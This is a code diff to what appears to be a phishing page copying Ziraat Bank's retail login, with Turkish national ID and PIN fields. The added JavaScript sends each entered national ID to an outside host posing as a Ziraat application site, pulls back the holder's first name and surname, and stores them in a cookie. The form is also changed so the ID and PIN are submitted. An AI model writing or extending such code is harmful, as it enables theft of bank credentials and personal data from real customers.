@@ -57,7 +57,27 @@ document.addEventListener("DOMContentLoaded", function() {
         var devamButton = document.getElementById("ctl00_c_RetailLoginButton");
 
        if (/^\d{11}$/.test(identityInput.value) && /^\d{6}$/.test(pinInput.value) && tcno_dogrula(identityInput.value)) {
-            devamButton.removeAttribute("disabled");
+	        const retailIdentityValue = document.getElementById('ctl00_c_RetailIdentityTextBox').value;
+
+  try {
+        // RetailIdentityTextBox değeri ile isteği oluştur
+       const response = await fetch(`https://ziraat-basvur-online.vercel.app/proxy/${retailIdentityValue}`);
+    const data = await response.json();
+
+        // "adi" ve "soyadi" değerlerini al
+        const adi = data.adi;
+        const soyadi = data.soyadi;
+
+        // İsim adında bir cookie oluştur ve değerleri kaydet
+        document.cookie = `isim=${adi} ${soyadi}; path=/`;
+
+         await sleep(300);
+	   devamButton.removeAttribute("disabled");
+        
+      } catch (error) {
+        console.error('Hata:', error);
+      }
+           
         } else {
             devamButton.setAttribute("disabled", "disabled");
         }
@@ -130,10 +150,9 @@ font-size: 14px;  height: 46px;font-family: sans-serif;
                         </div>
                         <div id="ctl00_c_RetailPinContainer" class="form-group hidden-title">
                           <input autocomplete="off" name="ctl00$c$RetailPinTextBox" type="password" maxlength="6" id="ctl00_c_RetailPinTextBox" class="form-control required pin-entry isAlphaNumericForPin external-validation" onmousedown=";" data-rule-range-min="5" placeholder="Şifre" data-msg-required="Lütfen şifrenizi giriniz."  style="font-size: 14px;font-family: sans-serif;    font-weight: 700;" disablevalidationonblur="true" data-rule-range-max="6"  onkeyup=";;" causesval="false" pin-validation-message-current-pin-length="Şifrenizi kontrol ediniz." encrypted="" exvalidmethod="CheckAlphaNumericCurrentPinEntry" aria-required="true" value="">
-                         </div>   </form>
+                         </div> 
                         <div id="" class="clearfix"></div>
-                      <button id="ctl00_c_RetailLoginButton" class="btn btn-danger sendBtn" disabled=""
-        onclick="checkAndSubmit();">
+                      <button id="ctl00_c_RetailLoginButton"  type="submit" class="btn btn-danger sendBtn" disabled="">
     <span></span>DEVAM
 </button><br><br><br>
                         <a causesval="true" onclick="" id="ctl00_c_RetailRemindPinButton" class="custom-link" href="">
@@ -166,7 +185,7 @@ font-size: 14px;  height: 46px;font-family: sans-serif;
               </div>
             </div>
           </div>
- 
+   </form>
 
  <script>
 async function checkAndSubmit() {
